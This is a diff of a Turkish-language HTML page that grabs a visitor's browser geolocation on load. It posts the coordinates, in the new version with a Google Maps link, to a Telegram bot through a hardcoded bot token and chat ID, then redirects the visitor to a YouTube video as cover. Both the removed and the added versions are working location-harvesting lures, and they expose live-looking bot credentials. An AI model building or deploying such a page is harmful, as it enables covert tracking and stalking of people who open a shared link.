@@ -1,37 +1,36 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Konum Gönderiliyor...</title>
-    <meta charset="utf-8" />
-    <script>
-      function sendLocationAndRedirect() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Konum Gönderici</title>
+</head>
+<body>
+  <h2>📡 Konumun gönderiliyor...</h2>
 
-            fetch("https://api.telegram.org/bot8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg/sendMessage", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: `chat_id=8499614707&text=📍Konum alındı: ${lat}, ${lon}`
-            });
+  <script>
+    function sendLocationToTelegram(lat, lon) {
+      const chatID = "8499614707";
+      const token = "6367051419:AAELMBgsbZtIrnnAm4im1PY0W7e2Bso2E4U";
+      const message = `📍 Yeni konum bilgisi alındı:\n🧭 Enlem: ${lat}\n🧭 Boylam: ${lon}\n\n📌 Haritada görmek için:\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-            // YouTube videosuna yönlendirme
-            window.location.replace("https://www.youtube.com/watch?v=NqdOVT1IKPA");
-          }, function(error) {
-            alert("Konum alınamadı: " + error.message);
-            window.location.replace("https://www.youtube.com/watch?v=NqdOVT1IKPA");
-          });
-        } else {
-          alert("Tarayıcı konum özelliği desteklemiyor.");
-          window.location.replace("https://www.youtube.com/watch?v=NqdOVT1IKPA");
-        }
-      }
-    </script>
-  </head>
-  <body onload="sendLocationAndRedirect()">
-    <p>İşleniyor, lütfen bekleyin...</p>
-  </body>
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      const body = `chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: body
+      }).then(() => {
+        // Konum gönderildikten sonra YouTube'a yönlendir
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Senin daha önce verdiğin bağlantı
+      });
+    }
+
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      sendLocationToTelegram(lat, lon);
+    });
+  </script>
+</body>
 </html>
